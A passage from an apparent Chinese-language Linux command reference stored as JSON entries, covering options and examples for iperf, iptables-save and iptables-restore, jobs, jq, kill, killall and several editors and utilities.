(v1.2或更高版本)</td>\n<td>Unix平台下Iperf作为后台守护进程运行。在Win32平台下，Iperf将作为服务运行。</td>\n</tr>\n<tr>\n<td>-R(v1.2或更高版本，仅用于Windows)</td>\n<td>卸载Iperf服务（如果它在运行）。</td>\n</tr>\n<tr>\n<td>-o(v1.2或更高版本，仅用于Windows)</td>\n<td>重定向输出到指定文件</td>\n</tr>\n<tr>\n<td>-c, --client host</td>\n<td>如果Iperf运行在服务器模式，并且用-c参数指定一个主机，那么Iperf将只接受指定主机的连接。此参数不能工作于UDP模式。</td>\n</tr>\n<tr>\n<td>-P, --parallel #</td>\n<td>服务器关闭之前保持的连接数。默认是0，这意味着永远接受连接。</td>\n</tr>\n<tr>\n<td>客户端专用选项</td>\n</tr>\n<tr>\n<td>-b, --bandwidth #[KM]</td>\n<td>UDP模式使用的带宽，单位bits/sec。此选项与-u选项相关。默认值是1 Mbit/sec。</td>\n</tr>\n<tr>\n<td>-c, --client host</td>\n<td>运行Iperf的客户端模式，连接到指定的Iperf服务器端。</td>\n</tr>\n<tr>\n<td>-d, --dualtest</td>\n<td>运行双测试模式。这将使服务器端反向连接到客户端，使用-L 参数中指定的端口（或默认使用客户端连接到服务器端的端口）。这些在操作的同时就立即完成了。如果你想要一个交互的测试，请尝试-r参数。</td>\n</tr>\n<tr>\n<td>-n, --num #[KM]</td>\n<td>传送的缓冲器数量。通常情况，Iperf按照10秒钟发送数据。-n参数跨越此限制，按照指定次数发送指定长度的数据，而不论该操作耗费多少时间。参考-l与-t选项。</td>\n</tr>\n<tr>\n<td>-r, --tradeoff</td>\n<td>往复测试模式。当客户端到服务器端的测试结束时，服务器端通过-l选项指定的端口（或默认为客户端连接到服务器端的端口），反向连接至客户端。当客户端连接终止时，反向连接随即开始。如果需要同时进行双向测试，请尝试-d参数。</td>\n</tr>\n<tr>\n<td>-t, --time #</td>\n<td>设置传输的总时间。Iperf在指定的时间内，重复的发送指定长度的数据包。默认是10秒钟。参考-l与-n选项。</td>\n</tr>\n<tr>\n<td>-L, --listenport #</td>\n<td>指定服务端反向连接到客户端时使用的端口。默认使用客户端连接至服务端的端口。</td>\n</tr>\n<tr>\n<td>-P, --parallel #</td>\n<td>线程数。指定客户端与服务端之间使用的线程数。默认是1线程。需要客户端与服务器端同时使用此参数。</td>\n</tr>\n<tr>\n<td>-S, --tos #</td>\n<td>出栈数据包的服务类型。许多路由器忽略TOS字段。你可以指定这个值，使用以\"0x\"开始的16进制数，或以\"0\"开始的8进制数或10进制数。  \n例如，16进制'0x10' = 8进制'020' = 十进制'16'。TOS值1349就是：  \nIPTOS_LOWDELAY minimize delay 0x10  \nIPTOS_THROUGHPUT maximize throughput 0x08  \nIPTOS_RELIABILITY maximize reliability 0x04  \nIPTOS_LOWCOST minimize cost 0x02</td>\n</tr>\n<tr>\n<td>-T, --ttl #</td>\n<td>出栈多播数据包的TTL值。这本质上就是数据通过路由器的跳数。默认是1，链接本地。</td>\n</tr>\n<tr>\n<td>-F (from v1.2 or higher)</td>\n<td>使用特定的数据流测量带宽，例如指定的文件。  \n$ iperf -c <server address> -F <file-name></td>\n</tr>\n<tr>\n<td>-I (from v1.2 or higher)</td>\n<td>与-F一样，由标准输入输出文件输入数据。</td>\n</tr>\n<tr>\n<td>杂项</td>\n</tr>\n<tr>\n<td>-h, --help</td>\n<td>显示命令行参考并退出 。</td>\n</tr>\n<tr>\n<td>-v, --version</td>\n<td>显示版本信息和编译信息并退出。</td>\n</tr>\n</tbody>\n</table>\n\n### 实例\n\n带宽测试通常采用UDP模式，因为能测出极限带宽、时延抖动、丢包率。在进行测试时，首先以链路理论带宽作为数据发送速率进行测试，例如，从客户端到服务器之间的链路的理论带宽为100Mbps，先用`-b 100M`进行测试，然后根据测试结果（包括实际带宽，时延抖动和丢包率），再以实际带宽作为数据发送速率进行测试，会发现时延抖动和丢包率比第一次好很多，重复测试几次，就能得出稳定的实际带宽。\n\n **UDP模式** \n\n服务器端：\n\n```shell\niperf -u -s\n```\n\n客户端：\n\n```shell\niperf -u -c 192.168.1.1 -b 100M -t 60\n```\n\n在udp模式下，以100Mbps为数据发送速率，客户端到服务器192.168.1.1上传带宽测试，测试时间为60秒。\n\n```shell\niperf -u -c 192.168.1.1 -b 5M -P 30 -t 60\n```\n\n客户端同时向服务器端发起30个连接线程，以5Mbps为数据发送速率。\n\n```shell\niperf -u -c 192.168.1.1 -b 100M -d -t 60\n```\n\n以100M为数据发送速率，进行上下行带宽测试。\n\n **TCP模式** \n\n服务器端：\n\n```shell\niperf -s\n```\n\n客户端：\n\n```shell\niperf -c 192.168.1.1 -t 60\n```\n\n在tcp模式下，客户端到服务器192.168.1.1上传带宽测试，测试时间为60秒。\n\n```shell\niperf -c 192.168.1.1  -P 30 -t 60\n```\n\n客户端同时向服务器端发起30个连接线程。\n\n```shell\niperf -c 192.168.1.1  -d -t 60\n```\n\n进行上下行带宽测试。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","iperf"]},{"title":"【Linux 命令】iptables-restore","url":"/linux-command/iptables-restore/","content":"\n还原iptables表的配置\n\n## 补充说明\n\n**iptables-restore命令** 用来还原iptables-save命令所备份的iptables配置。\n\n###  语法\n\n```shell\niptables-restore(选项)\n```\n\n###  选项\n\n```shell\n-c：指定在还原iptables表时候，还原当前的数据包计数器和字节计数器的值；\n-t：指定要还原表的名称。\n```\n\n###  实例\n\n```shell\niptables-restore < iptables.bak\n```\n\niptables.bak是iptables-save命令所备份的文件。\n\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","iptables-restore"]},{"title":"【Linux 命令】iptables-save","url":"/linux-command/iptables-save/","content":"\n备份iptables的表配置\n\n## 补充说明\n\n**iptables-save命令** 用于将linux内核中的iptables表导出到标准输出设备商，通常，使用shell中I/O重定向功能将其输出保存到指定文件中。\n\n###  语法\n\n```shell\niptables-save(选项)\n```\n\n###  选项\n\n```shell\n-c：指定要保存的iptables表时，保存当权的数据包计算器和字节计数器的值；\n-t：指定要保存的表的名称。\n```\n\n###  实例\n\n```shell\n[root@localhost ~]# iptables-save -t filter > iptables.bak\n[root@localhost ~]# cat iptables.bak\n# Generated by iptables-save v1.3.5 on Thu Dec 26 21:25:15 2013\n*filter\n:INPUT DROP [48113:2690676]\n:FORWARD accept [0:0]\n:OUTPUT ACCEPT [3381959:1818595115]\n-A INPUT -i lo -j ACCEPT\n-A INPUT -p tcp -m tcp --dport 22 -j ACCEPT\n-A INPUT -p tcp -m tcp --dport 80 -j ACCEPT\n-A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT\n-A INPUT -p icmp -j ACCEPT\n-A OUTPUT -o lo -j ACCEPT\nCOMMIT\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","iptables-save"]},{"title":"【Linux 命令】iptraf","url":"/linux-command/iptraf/","content":"\n实时地监视网卡流量\n\n## 补充说明\n\n**iptraf命令** 可以实时地监视网卡流量，可以生成网络协议数据包信息、以太网信息、网络节点状态和ip校验和错误等信息。\n\n###  语法\n\n```shell\niptraf(选项)\n```\n\n###  选项\n\n```shell\n-i网络接口：立即在指定网络接口上开启IP流量监视；\n-g：立即开始生成网络接口的概要状态信息；\n-d网络接口：在指定网络接口上立即开始监视明细的网络流量信息；\n-s网络接口：在指定网络接口上立即开始监视TCP和UDP网络流量信息；\n-z网络接口：在指定网络接口上显示包计数；\n-l网络接口：在指定网络接口上立即开始监视局域网工作站信息；\n-t时间：指定iptraf指令监视的时间；\n-B；将标注输出重新定向到“/dev/null”，关闭标注输入，将程序作为后台进程运行；\n-f：清空所有计数器；\n-h：显示帮助信息。\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","iptraf"]},{"title":"【Linux 命令】iptstate","url":"/linux-command/iptstate/","content":"\n显示iptables的工作状态\n\n## 补充说明\n\n**iptstate命令** 以top指令类似的风格时显示Linux内核中iptables的工作状态。\n\n###  语法\n\n```shell\niptstate(选项)\n```\n\n###  选项\n\n```shell\n-b：指定输出信息的排序规则；\n-d：不动态地改变窗口大小；\n-f：过滤本地回送信息；\n-l：将ip地址解析为域名；\n-L：隐藏于DNS查询相关状态；\n-r：指定刷新屏幕的频率；\n-R：反序排列；\n-s：单次运行模式；\n-t：显示汇总信息。\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","iptstate"]},{"title":"【Linux 命令】ispell","url":"/linux-command/ispell/","content":"\n检查文件中出现的拼写错误\n\n## 补充说明\n\n**ispell命令** 用于检查文件中出现的拼写错误。\n\n###  语法\n\n```shell\nispell(参数)\n```\n\n###  参数\n\n文件：指定要进行拼写检查的文件。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","ispell"]},{"title":"【Linux 命令】jed","url":"/linux-command/jed/","content":"\n主要用于编辑代码的编辑器\n\n## 补充说明\n\n**jed命令** 是由Slang所开发，其主要用用途是编辑程序的源代码。它支持彩色语法加亮显示，可以模拟emacs，EDT，wordstar和Brief编辑器。\n\n###  语法\n\n```shell\njed(选项)(参数)\n```\n\n###  选项\n\n```shell\n-2：显示上下两个编辑区；\n-batch：以批处理模式来执行；\n-f<函数>：执行Slang函数；\n-g<行数>：移到缓冲区中指定的行数；\n-i<文件>：将指定的文件载入缓冲区；\n-n：不要载入jed.rc配置文件；\n-s<字符串>：查找并移到指定的字符串。\n```\n\n###  参数\n\n文件：指定待编辑的文件列表。\n\n###  实例\n\n以上下两个编辑区的方式，开启 mysource.c 原始代码文件。若要切换编辑区，可利用稍后介绍的命令，开启操作命令，开启功能表后，按 3 ，再按 2 ，即可切换编辑区：\n\n```shell\njed -2 mysource.c\n```\n\n **操作** \n\n有些Emacs的组合键和jed菜单组合键冲突例如Alt+f在Emacs中应该是“前进一个单词”，而在jed中则是“文件菜单” 想使用Emacs风格的组合键的话，编辑`/usr/share/jed/lib/menus.slc`找到如下段落：\n\n```shell\nunsetsetkey (\"selectmenubar\", \"\\em\");\nunsetsetkey (\"@\\emF\", \"\\ef\");\nunsetsetkey (\"@\\emE\", \"\\ee\");\nunsetsetkey (\"@\\emo\", \"\\eo\");\n% Mode menu unsetsetkey (\"@\\emS\", \"\\es\");\nunsetsetkey (\"@\\emB\", \"\\eb\");\nunsetsetkey (\"@\\emi\", \"\\ei\");\nunsetsetkey (\"@\\emH\", \"\\eh\");\nunset_setkey (\"@\\emy\", \"\\ey\");\n```\n\n可以根据自己的需要修改，也可以简单的注释掉；使用菜单可以用F10键。\n\n由于Jed可模拟多种编辑器，其各自按键指令也有所不同。这里以模拟 Emacs 为例，说明在编辑器中的操作方法。\n\n **文件** \n\n```shell\n/usr/share/jed/lib/*.sl 这是默认的运行jed slang的文件。\n/usr/share/jed/lib/site.sl 这是默认的启动文件。\n/etc/jed.rc 这是全局系统配置文件。\n~/.jedrc 这是用户配置文件。\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","jed"]},{"title":"【Linux 命令】jobs","url":"/linux-command/jobs/","content":"\n显示作业的状态。\n\n## 概要\n\n```shell\njobs [-lnprs] [jobspec ...]\njobs -x command [args]\n```\n\n## 主要用途\n\n- 显示作业的状态。\n- 列出活动的作业。\n- 列出停止的作业。\n\n## 选项\n\n```shell\n-l\t在作业信息中额外的列出PID。\n-n\t只列出最近一次通知以来状态变更的作业。\n-p\t只列出PID。\n-r\t只输出处于运行状态的作业。\n-s\t只输出处于停止状态的作业。\n```\n\n## 返回值\n\n返回状态为成功除非给出了非法选项、执行出现错误。\n\n如果使用`jobs -x command [args]`形式执行，那么返回值为`command`的退出状态。\n\n## 例子\n\n```shell\n[user2@pc] ssh 192.168.1.4\npc@192.168.1.4's password:\n# 此时按下ctrl+z使得交互停止。\n[1]+  Stopped                 ssh 192.168.1.4\n\n[user2@pc] sleep 60 &\n[2] 13338\n\n[user2@pc] jobs\n[1]-  Stopped                 ssh 192.168.1.4\n[2]   Running                 sleep 60 &\n\n[user2@pc] jobs -l\n[1]- 12927 Stopped                 ssh 192.168.1.4\n[2]  13338 Running                 sleep 60 &\n\n[user2@pc] jobs -p\n12927\n13338\n\n[user2@pc] jobs -s\n[1]-  Stopped                 ssh 192.168.1.4\n\n[user2@pc] jobs -r\n[2]   Running                 sleep 60 &\n\n[user2@pc] kill -9 12927\n[2]   Done                    sleep 60\n\n[user2@pc] jobs -n -l\n[1]+ 12927 Killed             ssh 192.168.1.4\n\n[user2@pc] jobs -n -l\n```\n\n### 注意\n\n1. `bash`的作业控制命令包括`bg fg kill wait disown suspend`。\n2. 该命令需要`set`选项`monitor`处于开启状态时才能执行；查看作业控制状态：输入`set -o`查看`monitor`行；执行`set -o monitor`或`set -m`开启该选项。\n3. 该命令是bash内建命令，相关的帮助信息请查看`help`命令。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","jobs"]},{"title":"【Linux 命令】joe","url":"/linux-command/joe/","content":"\n强大的纯文本编辑器\n\n## 补充说明\n\n**joe命令** 是一款功能强大的纯文本编辑器，拥有众多编写程序和文本的优良特性。\n\n###  语法\n\n```shell\njoe(选项)(参数)\n```\n\n###  选项\n\n```shell\n-force：强制在最后一行的结尾处加上换行符号；\n-lines<行数>：设置行数；\n-lightoff：选取的区块在执行完区块命令后，就会恢复成原来的状态；\n-autoindent：自动缩排；\n-backpath：<目录>：指定备份文件的目录；\n-beep：编辑时，若有错误即发出哔声；\n-columns<栏位>：设置栏数；\n-csmode：可执行连续查找模式；\n-dopadding：是程序跟tty间存在缓冲区；\n-exask：在程序中，执行“Ctrl+k+x”时，会先确认是否要保存文件；\n-force：强制在最后一行的结尾处加上换行符号；\n-help：执行程序时一并显示帮助；\n-keepup：在进入程序后，画面上方为状态列；\n-marking：在选取区块时，反白区块会随着光标移动；\n-mid：当光标移出画面时，即自动卷页，使光标回到中央；\n-nobackups：不建立备份文件；\n-nonotice：程序执行时，不显示版本信息；\n-nosta：程序执行时，不显示状态列；\n-noxon：尝试取消“Ctrl+s”和“Ctrl+q”键的功能；\n-orphan：若同时开启一个以上的文件，则其他文件会置于独立的缓冲区，而不会另外开启编辑区；\n-pg<行数>：按“PageUp”或“PageDown”换页时，所要保留前一页的行数；\n-skiptop<行数>：不使用屏幕上方指定的行数。\n```\n\n###  参数\n\n文件：指定要编辑的文件。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","joe"]},{"title":"【Linux 命令】join","url":"/linux-command/join/","content":"\n两个文件中指定栏位内容相同的行连接起来\n\n## 补充说明\n\n**join命令** 用来将两个文件中，制定栏位内容相同的行连接起来。找出两个文件中，指定栏位内容相同的行，并加以合并，再输出到标准输出设备。\n\n###  语法\n\n```shell\njoin(选项)(参数)\n```\n\n###  选项\n\n```shell\n-a<1或2>：除了显示原来的输出内容之外，还显示指令文件中没有相同栏位的行；\n-e<字符串>：若[文件1]与[文件2]中找不到指定的栏位，则在输出中填入选项中的字符串；\n-i或--ignore-case：比较栏位内容时，忽略大小写的差异；\n-o<格式>：按照指定的格式来显示结果；\n-t<字符>：使用栏位的分割字符；\n-v<1或2>：更-a相同，但是只显示文件中没有相同栏位的行；\n-1<栏位>：连接[文件1]指定的栏位；\n-2<栏位>：连接[文件2]指定的栏位。\n```\n\n###  参数\n\n*   文件1：要进行合并操作的第1个文件参数；\n*   文件2：要进行合并操作的第2个文件参数。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","join"]},{"title":"【Linux 命令】jq","url":"/linux-command/jq/","content":"\n一个灵活的轻量级命令行JSON处理器\n\n### 补充说明\n\njq 是 stedolan 开发的一个轻量级的和灵活的命令行JSON处理器，源码请参考 [jq 项目主页](https://github.com/stedolan/jq)\n\njq 用于处理JSON输入，将给定过滤器应用于其JSON文本输入并在标准输出上将过滤器的结果生成为JSON。\n\n最简单的过滤器是`.`，它将jq的输入未经修改地复制到其输出中（格式设置除外）。\n\n请注意，jq 当前仅支持64位双精度浮点数（IEEE754）。\n\n\n### 安装\n\n```bash\n# Debian系，如 Ubuntu\nsudo apt-get install jq\n\n# RedHat系, 如 CentOS\nyum install jq\n```\n\n### 语法\n\n```bash\njq [options] <jq filter> [file...]\njq [options] --args <jq filter> [strings...]\njq [options] --jsonargs <jq filter> [JSON_TEXTS...]\n```\n\n### 选项\n\n```bash\n-c               紧凑而不是漂亮的输出;\n-n               使用`null`作为单个输入值;\n-e               根据输出设置退出状态代码;\n-s               将所有输入读取（吸取）到数组中；应用过滤器;\n-r               输出原始字符串，而不是JSON文本;\n-R               读取原始字符串，而不是JSON文本;\n-C               为JSON着色;\n-M               单色（不要为JSON着色）;\n-S               在输出上排序对象的键;\n--tab            使用制表符进行缩进;\n--arg a v        将变量$a设置为value<v>;\n--argjson a v    将变量$a设置为JSON value<v>;\n--slurpfile a f  将变量$a设置为从<f>读取的JSON文本数组;\n--rawfile a f    将变量$a设置为包含<f>内容的字符串;\n--args           其余参数是字符串参数，而不是文件;\n--jsonargs       其余的参数是JSON参数，而不是文件;\n--               终止参数处理;\n```\n\n### 例子\n\n`.`: 以漂亮的方式输出\n\n```bash\n$ echo '{ \"foo\": { \"bar\": { \"baz\": 123 } } }' | jq '.'\n{\n  \"foo\": {\n    \"bar\": {\n      \"baz\": 123\n    }\n  }\n}\n\n```\n\n`.foo, .foo.bar, .foo?`: 获取一个键的值\n\n```bash\n$ echo '{\"foo\": 42, \"bar\": \"less interesting data\"}' | jq '.foo'\n42\n```\n\n`.[], .[]?, .[2], .[10:15]`: 数组运算\n\n```bash\n$ echo '[{\"name\":\"JSON\", \"good\":true}, {\"name\":\"XML\", \"good\":false}]' | jq '.[1]'\n{\n  \"name\": \"XML\",\n  \"good\": false\n}\n\n```\n\n`[], {}`: 构造一个数组/对象\n\n```bash\n$ echo '{\"user\":\"stedolan\",\"titles\":[\"JQ Primer\", \"More JQ\"]}' | jq '{user, title: .titles[]}'\n\n{\n  \"user\": \"stedolan\",\n  \"title\": \"JQ Primer\"\n}\n{\n  \"user\": \"stedolan\",\n  \"title\": \"More JQ\"\n}\n\n```\n\n`length`: 计算一个值的长度\n\n```bash\n$ echo '[[1,2], \"string\", {\"a\":2}, null]' | jq '.[] | length'                                  \n2\n6\n1\n0\n\n```\n\n`keys`: 取出数组中的键\n\n```bash\n$ echo '{\"abc\": 1, \"abcd\": 2, \"Foo\": 3}' | jq 'keys'                                        \n[\n  \"Foo\",\n  \"abc\",\n  \"abcd\"\n]\n\n```\n\n`,`: 使用多个过滤器\n\n```bash\n$ echo '{ \"foo\": 42, \"bar\": \"something else\", \"baz\": true}' | jq '.foo, .bar' \n42\n\"something else\"\n\n```\n\n`|`: 通过管道将一个过滤器的输出当做下一个过滤器的输入\n\n```bash\n$ echo '[{\"name\":\"JSON\", \"good\":true}, {\"name\":\"XML\", \"good\":false}]' | jq '.[] | .name'                                                 \n\"JSON\"\n\"XML\"\n\n```\n\n`select(foo)`: 如果foo返回true，则输入保持不变\n\n```bash\n$ echo '[1,5,3,0,7]' | jq 'map(select(. >= 2))'                                                    \n[\n  5,\n  3,\n  7\n]\n\n```\n\n`map(foo)`: 每个输入调用过滤器\n\n```bash\n$ echo '[1,2,3]' | jq 'map(.+1)'\n[\n  2,\n  3,\n  4\n]\n\n```\n\n`if-then-else-end`: 条件判断\n\n```bash\n $ echo '2' | jq 'if . == 0 then \"zero\" elif . == 1 then \"one\" else \"many\" end'\n\n\"many\"\n\n```\n\n`\\(foo)`: 在字符串中插入值并进行运算\n\n```bash\n$ echo '42' | jq '\"The input was \\(.), which is one less than \\(.+1)\"'          \n\n\"The input was 42, which is one less than 43\"\n\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","jq"]},{"title":"【Linux 命令】jwhois","url":"/linux-command/jwhois/","content":"\nwhois 客户端服务\n\n## 补充说明\n\n**jwhois**  searches Whois servers for the object on the command line.The host to query is taken from a global configuration file, a configuration file specified on the command line, or selected directly on the command line.\n\n###  语法\n\n```shell\njwhois [选项]\n```\n\n###  选项\n\n```shell\n--version                  display version number and patch level\n--help                     display this help\n-v, --verbose              verbose debug output\n-c FILE, --config=FILE     use FILE as configuration file\n-h HOST, --host=HOST       explicitly query HOST\n-n, --no-redirect          disable content redirection\n-s, --no-whoisservers      disable whois-servers.net service support\n-a, --raw                  disable reformatting of the query\n-i, --display-redirections display all redirects instead of hiding them\n-p PORT, --port=PORT       use port number PORT (in conjunction with HOST)\n-r, --rwhois               force an rwhois query to be made\n--rwhois-display=DISPLAY   sets the display option in rwhois queries\n--rwhois-limit=LIMIT       sets the maximum number of matches to return\n```\n\n> 注：以上英文部分寻求网友协助翻译，翻译结果可发送至 sa(at)linuxde.net，谢谢！\n\n###  实例\n\n显示指定用户信息：\n\n```shell\n jwhois root\n\n# 查找root用户信息\n```\n\n查询域名信息：\n\n```shell\n[root@localhost ~] jwhois linuxde.net\n[Querying whois.verisign-grs.com]\n[Redirected to whois.west263.com]\n[Querying whois.west263.com]\n[whois.west263.com]\nDomain Name: linuxde.net                   \nRegistry Domain id: whois protect\nRegistrar WHOIS Server: whois.west263.com\n\n...省略部分内容\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","jwhois"]},{"title":"【Linux 命令】kernelversion","url":"/linux-command/kernelversion/","content":"\n打印当前内核的主版本号\n\n## 补充说明\n\n**kernelversion命令** 用于打印当前内核的主版本号。\n\n###  语法\n\n```shell\nkernelversion\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","kernelversion"]},{"title":"【Linux 命令】kexec","url":"/linux-command/kexec/","content":"\n从当前正在运行的内核引导到一个新内核\n\n## 补充说明\n\n**kexec命令** 是Linux内核的一个补丁，让您可以从当前正在运行的内核直接引导到一个新内核。在上面描述的引导序列中，kexec跳过了整个引导装载程序阶段（第一部分）并直接跳转到我们希望引导到的内核。不再有硬件的重启，不再有固件操作，不再涉及引导装载程序。完全避开了引导序列中最弱的一环 -- 固件。这一功能部件带来的最大益处在于，系统现在可以极其快速地重新启动。\n\n **kexec的好处：** 要求高可用性的系统，以及需要不断重新启动系统的内核开发人员，都将受益于kexec。因为 kexec跳过了系统重新启动过程中最耗时的部分（也就是固件初始化硬件设备的阶段），所以重新启动变得非常快，可用性得到了提高。\n\n###  语法\n\n```shell\nkexec(选项)\n```\n\n###  选项\n\n```shell\n-l：指定内核映像文件；\n-e：允许当前被加载的内核；\n-f：强制立即调用系统调用“kexec”，而不调用“shutdown”；\n-t：指定新内核的类型；\n-u：卸载当前的kexec目标内核。\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","kexec"]},{"title":"【Linux 命令】kill","url":"/linux-command/kill/","content":"\n发送信号到进程。\n\n## 目录\n\n- [bash内建命令](#内建命令)\n- [GNU coreutils中的命令](#外部命令)\n\n## 内建命令\n\n#### 概要\n\n```shell\nkill [-s sigspec | -n signum | -sigspec] pid | jobspec ...\nkill -l [sigspec]\n```\n\n#### 主要用途\n\n- 发送信号到作业或进程（可以为多个）。\n- 列出信号。\n\n#### 选项\n\n```shell\n-s sig    信号名称。\n-n sig    信号名称对应的数字。\n-l        列出信号名称。如果在该选项后提供了数字那么假设它是信号名称对应的数字。\n-L        等价于-l选项。\n```\n\n#### 参数\n\npid：进程ID\n\njobspec：作业标识符\n\n#### 返回值\n\n返回状态为成功除非给出了非法选项、执行出现错误。\n\n#### 例子\n\n```shell\n[user2@pc] kill -l 9\nKILL\n\n# 列出所有信号名称：\n[user2@pc] kill -l\n 1) SIGHUP       2) SIGINT       3) SIGQUIT      4) SIGILL\n 5) SIGTRAP      6) SIGABRT      7) SIGBUS       8) SIGFPE\n 9) SIGKILL     10) SIGUSR1     11) SIGSEGV     12) SIGUSR2\n13) SIGPIPE     14) SIGALRM     15) SIGTERM     16) SIGSTKFLT\n17) SIGCHLD     18) SIGCONT     19) SIGSTOP     20) SIGTSTP\n21) SIGTTIN     22) SIGTTOU     23) SIGURG      24) SIGXCPU\n25) SIGXFSZ     26) SIGVTALRM   27) SIGPROF     28) SIGWINCH\n29) SIGIO       30) SIGPWR      31) SIGSYS      34) SIGRTMIN\n35) SIGRTMIN+1  36) SIGRTMIN+2  37) SIGRTMIN+3  38) SIGRTMIN+4\n39) SIGRTMIN+5  40) SIGRTMIN+6  41) SIGRTMIN+7  42) SIGRTMIN+8\n43) SIGRTMIN+9  44) SIGRTMIN+10 45) SIGRTMIN+11 46) SIGRTMIN+12\n47) SIGRTMIN+13 48) SIGRTMIN+14 49) SIGRTMIN+15 50) SIGRTMAX-14\n51) SIGRTMAX-13 52) SIGRTMAX-12 53) SIGRTMAX-11 54) SIGRTMAX-10\n55) SIGRTMAX-9  56) SIGRTMAX-8  57) SIGRTMAX-7  58) SIGRTMAX-6\n59) SIGRTMAX-5  60) SIGRTMAX-4  61) SIGRTMAX-3  62) SIGRTMAX-2\n63) SIGRTMAX-1  64) SIGRTMAX\n\n# 下面是常用的信号。\n# 只有第9种信号(SIGKILL)才可以无条件终止进程，其他信号进程都有权利忽略。\n\nHUP     1    终端挂断\nINT     2    中断（同 Ctrl + C）\nQUIT    3    退出（同 Ctrl + \\）\nKILL    9    强制终止\nTERM   15    终止\nCONT   18    继续（与STOP相反，fg/bg命令）\nSTOP   19    暂停（同 Ctrl + Z）\n```\n\n```shell\n# 以下发送KILL信号的形式等价。当然还有更多的等价形式，在此不一一列举了。\n[user2@pc] kill -s SIGKILL PID\n[user2@pc] kill -s KILL PID\n[user2@pc] kill -n 9 PID\n[user2@pc] kill -9 PID\n\n[user2@pc] sleep 90 &\n[1] 178420\n\n# 终止作业标识符为1的作业。\n[user2@pc] kill -9 %1\n\n[user2@pc] jobs -l\n[1]+ 178420 KILLED                  ssh 192.168.1.4\n\n[user2@pc] sleep 90 &\n[1] 181357\n\n# 发送停止信号。\n[user2@pc] kill -s STOP 181357\n\n[user2@pc] jobs -l\n[1]+ 181537 Stopped (signal)        sleep 90\n\n# 发送继续信号。\n[user2@pc] kill -s CONT 181357\n\n[user2@pc] jobs -l\n[1]+ 181537 Running                 sleep 90 &\n```\n\n#### 注意\n\n1. `bash`的作业控制命令包括`bg fg kill wait disown suspend`。\n2. 该命令是bash内建命令，相关的帮助信息请查看`help`命令。\n\n\n## 外部命令\n\n#### 概要\n\n```shell\nkill [-signal|-s signal|-p] [-q value] [-a] [--] pid|name...\nkill -l [number] | -L\n```\n\n#### 主要用途\n\n- 发送信号到进程（可以为多个）。\n\n- 列出信号。\n\n#### 选项\n\n```shell\n-s, --signal signal    要发送的信号，可能是信号名称或信号对应的数字。\n-l, --list [number]    打印信号名称或转换给定数字到信号名称。信号名称可参考文件（/usr/include/linux/signal.h）。\n-L, --table            和'-l'选项类似，但是输出信号名称以及信号对应的数字。\n-a, --all              不要限制“命令名到pid”的转换为具有与当前进程相同的UID的进程。\n-p, --pid              打印目标进程的PID而不发送信号。\n--verbose              打印信号以及接收信号的PID。\n-q, --queue value      使用sigqueue(3)而不是kill(2)。参数value是信号对应的数字。\n                           如果接收进程已为此信号安装了处理程序将SA_SIGINFO标记为sigaction(2)，则可以获取\n                           该数据通过siginfo_t结构的si_sigval字段。\n--help                 显示帮助信息并退出。\n--version              显示版本信息并退出。\n```\n\n#### 参数\n\n接收信号的进程列表可以是PID以及name的混合组成。\n\nPID：每一个PID可以是以下四种情况之一：\n\n状态|说明\n:--:|:--:\nn | 当n大于0时，PID为n的进程接收信号。\n0 | 当前进程组中的所有进程均接收信号。\n-1 | PID大于1的所有进程均接收信号。\n-n | 当n大于1时，进程组n中的所有进程接收信号。当给出了一个参数的形式为“-n”，想要让它表示一个进程组，那么必须首先指定一个信号，或参数前必须有一个“--”选项，否则它将被视为发送的信号。\n\nname：使用此名称调用的所有进程将接收信号。\n\n#### 例子\n\n```shell\n> sleep 20 &\n\n# 列出对应的PID。\n> kill -p sleep\n23021\n```\n\n#### 返回值\n\n- 0 成功。\n- 1 失败。\n- 64 部分成功（当指定了多个进程时）。\n\n#### 注意\n\n1. 该命令是`GNU coreutils`包中的命令，相关的帮助信息请查看`man -s 1 kill`或`info coreutils 'kill invocation'`。\n2. 启动或关闭内建命令请查看`enable`命令，关于同名优先级的问题请查看`builtin`命令的例子部分的相关讨论。\n3. 与`kill`命令类似的有`xkill`，`pkill`,`killall`等，用于不同的目的和场景。\n\n#### 参考链接\n[发送信号到进程](https://bash.cyberciti.biz/guide/Sending_signal_to_Processes)\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","kill"]},{"title":"【Linux 命令】killall","url":"/linux-command/killall/","content":"\n使用进程的名称来杀死一组进程\n\n## 补充说明\n\n**killall命令** 使用进程的名称来杀死进程，使用此指令可以杀死一组同名进程。我们可以使用kill命令杀死指定进程PID的进程，如果要找到我们需要杀死的进程，我们还需要在之前使用ps等命令再配合grep来查找进程，而killall把这两个过程合二为一，是一个很好用的命令。\n\n###  语法\n\n```shell\nkillall(选项)(参数)\n```\n\n###  选项\n\n```shell\n-e：对长名称进行精确匹配；\n-l：忽略大小写的不同；\n-p：杀死进程所属的进程组；\n-i：交互式杀死进程，杀死进程前需要进行确认；\n-l：打印所有已知信号列表；\n-q：如果没有进程被杀死。则不输出任何信息；\n-r：使用正规表达式匹配要杀死的进程名称；\n-s：用指定的进程号代替默认信号“SIGTERM”；\n-u：杀死指定用户的进程。\n```\n\n###  参数\n\n进程名称：指定要杀死的进程名称。\n\n###  实例\n\n杀死所有同名进程\n\n```shell\nkillall vi\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","killall"]},{"title":"【Linux 